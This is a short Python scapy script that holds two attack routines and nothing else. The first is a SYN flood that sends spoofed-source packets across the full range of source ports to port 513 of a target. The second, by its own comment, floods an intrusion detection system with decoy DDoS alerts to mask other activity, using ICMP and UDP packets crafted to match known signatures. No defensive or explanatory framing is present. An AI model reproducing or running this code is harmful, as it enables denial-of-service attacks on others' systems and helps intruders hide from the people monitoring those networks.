from scapy.all import * 

def synFlood(src, tgt):
	for sport in range(1024,65535):
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=sport, dport=513) 
		pkt = IPlayer / TCPlayer
		send(pkt)

def ddosTest(src, dst, iface, count):									# simply triggers a barrage of DDoS alerts on an IDS (to mask other activity), not an actual DDoS
	pkt=IP(src=src,dst=dst)/ICMP(type=8,id=678)/Raw(load='1234')
	send(pkt, iface=iface, count=count)
	pkt = IP(src=src,dst=dst)/ICMP(type=0)/Raw(load='AAAAAAAAAA')
	send(pkt, iface=iface, count=count)
	pkt = IP(src=src,dst=dst)/UDP(dport=31335)/Raw(load='PONG')
	send(pkt, iface=iface, count=count)
	pkt = IP(src=src,dst=dst)/ICMP(type=0,id=456)
	send(pkt, iface=iface, count=count)


src="1.3.3.7"
dst="192.168.1.102"

iface="en0"
count=1

#ddosTest(src,dst,iface,count)
#synFlood(src, tgt)
